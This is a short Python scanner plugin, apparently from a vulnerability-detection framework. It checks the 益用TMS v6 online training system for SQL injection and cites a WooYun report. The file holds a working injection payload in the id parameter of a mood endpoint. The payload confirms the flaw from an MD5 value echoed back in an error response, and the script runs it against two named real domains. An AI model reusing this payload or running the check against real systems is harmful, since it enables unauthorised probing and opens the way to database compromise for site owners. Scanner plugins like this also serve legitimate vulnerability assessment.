#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:益用TMS v6在线培训系统注入
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0118985


def assign(service,arg):
    if service=="euse_study":
        return True,arg 


def  audit(arg):

    url=arg+"js/mood/xinqing.aspx?action=mood&classid=download&id=1%27%20and%20sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))>0--&typee=mood3&m=2"
    code,head,res,errcode,_=curl.curl2(url)
    if code==500 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
            security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('euse_study','http://study.euse.com.cn/')[1])
    audit(assign('euse_study','http://www.jiudianxueyuan.com/')[1])